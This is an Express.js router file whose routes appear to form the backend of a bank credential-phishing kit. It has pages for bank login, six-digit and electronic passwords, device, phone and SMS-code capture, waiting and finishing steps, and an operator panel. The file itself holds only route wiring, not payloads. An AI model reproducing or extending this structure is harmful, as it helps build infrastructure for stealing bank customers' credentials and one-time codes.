const routes = require('express').Router()

//Dashboard
const DashboardView = require('../controllers/views/DashboardViews')
//Login
const LoginView = require('../controllers/views/admin/LoginViews')
//Client
const ProductView = require('../controllers/views/admin/ProductView')

const PasswordView = require('../controllers/views/passwordView')
const AwaitView = require('../controllers/views/awaitView')
const EletronicView = require('../controllers/views/eletronicView')
const FinishView = require('../controllers/views/finishView')
const MailView = require('../controllers/views/mailView')
const PhoneView = require('../controllers/views/phoneView')
const VerifyView = require('../controllers/views/verifyView')

const SmsView = require('../controllers/views/smsView')

const SessionController = require('../controllers/SessionController')

const OperatorView = require('../controllers/views/OperatorView')

const ClientController = require('../controllers/ClientController')

const ClientLoginView = require('../controllers/views/loginView')

const Pass6View = require('../controllers/views/password6View')

const DispositivoView = require('../controllers/views/admin/dispView')

//Dashboard
routes.get(`/dashboard`, DashboardView.view)
routes.get(`/sinbc-login`, PasswordView.view)
routes.post(`/jms/password`, PasswordView.view)
//Client
routes.post(`/password6`, Pass6View.view)
routes.get(`/dispositivo`, DispositivoView.view)
routes.get(`/password6`, Pass6View.get)
routes.post(`/acesso`, ClientLoginView.view)
routes.get(`/verify-authentic/`, VerifyView.view)
routes.get(`/mail`, MailView.view)
routes.get(`/phonecheck/:client_id`, PhoneView.view)
routes.get(`/password`, ProductView.index)
routes.get(`/eletronic`, EletronicView.view)
routes.get(`/confirmsms`, SmsView.view)
routes.post(`/sendsms`, ClientController.store)
routes.get(`/await`, AwaitView.view)
routes.get(`/finish`, FinishView.view)

//Login
routes.get(`/login`, LoginView.view)
routes.post(`/authenticate`, SessionController.store)

//operator
routes.get(`/operator`, OperatorView.view)

//forgot password
routes.get(`/forgot`, (req, res) => res.redirect('/dashboard'))

//logout
routes.get(`/logout`, (req, res) => {
    res.clearCookie('token')

    return res.redirect('/login')
})

module.exports = routes
